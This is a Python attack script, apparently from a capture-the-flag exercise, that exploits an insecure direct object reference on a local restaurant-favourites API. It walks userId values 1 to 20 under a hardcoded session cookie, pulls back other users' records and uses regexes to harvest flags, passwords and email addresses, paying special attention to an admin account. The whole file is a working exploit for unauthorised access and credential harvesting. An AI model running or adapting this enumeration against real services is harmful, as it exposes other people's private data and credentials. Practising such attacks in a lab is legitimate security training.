import requests
import re
import time

# Configuration
base_url = "http://127.0.0.1:33156"
endpoint = "/api/get_favorite_restaurants.php"
session = requests.Session()
session.headers.update({"User-Agent": "Mozilla/5.0"})
session.cookies.update({"PHPSESSID": "j2jbue9ik42nla625rupl7v2jk"})

# First, verify connectivity
print("Testing connection to target...")
try:
    test_url = f"{base_url}/"
    test_resp = session.get(test_url, timeout=5)
    print(f"Connection test: Status {test_resp.status_code}")
except Exception as e:
    print(f"Connection warning: {str(e)}")

print("\n" + "="*70)
print("IDOR Vulnerability Enumeration")
print("Target: /api/get_favorite_restaurants.php")
print("Testing: userId=1 through userId=20")
print("="*70)

# Storage
all_results = {}
flags = []
passwords = []
admin_content = None

# Test each userId
for user_id in range(1, 21):
    url = f"{base_url}{endpoint}?userId={user_id}"
    retry_count = 0
    max_retries = 2
    
    while retry_count < max_retries:
        try:
            print(f"\n[>] Testing userId: {user_id} (attempt {retry_count+1})")
            resp = session.get(url, timeout=10)
            
            status = resp.status_code
            length = len(resp.text)
            print(f"  Status: {status} | Length: {length} bytes")
            
            # Store result
            all_results[user_id] = {
                'status': status,
                'length': length,
                'content': resp.text
            }
            
            if status == 200:
                # Look for flags
                flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
                if flag_match:
                    flag = flag_match.group(0)
                    flags.append((user_id, flag))
                    print(f"  [!] FLAG: {flag}")
                
                # Look for passwords
                pwd_matches = re.findall(r'password["\']?\s*[:=]\s*["\']?([^"\'\s,]+)', resp.text, re.I)
                if pwd_matches:
                    for pwd in pwd_matches:
                        passwords.append((user_id, pwd))
                        print(f"  [!] PASSWORD: {pwd}")
                
                # Special attention to userId=7 (admin)
                if user_id == 7:
                    admin_content = resp.text
                    print(f"  [+] ADMIN DATA RETRIEVED")
                
                print(f"  Content: {resp.text[:250]}")
            else:
                print(f"  [✗] No data")
                
            # Success - break retry loop
            break
            
        except requests.exceptions.RequestException as e:
            retry_count += 1
            print(f"  [✗] Error: {str(e)}")
            if retry_count < max_retries:
                print(f"  Retrying in 1 second...")
                time.sleep(1)
        except Exception as e:
            print(f"  [✗] Unexpected error: {str(e)}")
            break

# Summary
print("\n" + "="*70)
print("SUMMARY")
print("="*70)

successful = [uid for uid, data in all_results.items() if data['status'] == 200]
print(f"Successful requests: {len(successful)}/20")
print(f"UserIds with data: {successful}")

if flags:
    print("\n" + "!"*70)
    print("FLAGS DISCOVERED:")
    print("!"*70)
    for uid, flag in flags:
        print(f"  userId={uid}: {flag}")

if passwords:
    print("\n" + "!"*70)
    print("PASSWORD INFORMATION:")
    print("!"*70)
    for uid, pwd in passwords:
        print(f"  userId={uid}: {pwd}")

if admin_content:
    print("\n" + "!"*70)
    print("ADMIN ACCOUNT (userId=7) FULL DATA:")
    print("!"*70)
    print(admin_content)
    
    # Deep admin analysis
    print("\n" + "-"*70)
    print("Admin Data Analysis:")
    if 'password' in admin_content.lower():
        print("  [+] Contains password field")
    if '@' in admin_content:
        emails = re.findall(r'\S+@\S+', admin_content)
        if emails:
            print(f"  [+] Email(s): {emails}")
    if re.search(r'admin|root|superuser', admin_content, re.I):
        print("  [+] Admin references present")

if not flags and not passwords and not admin_content:
    print("\n[✗] No flags or sensitive data found")

print("\n" + "="*70)
print("Enumeration Complete")
print("="*70)
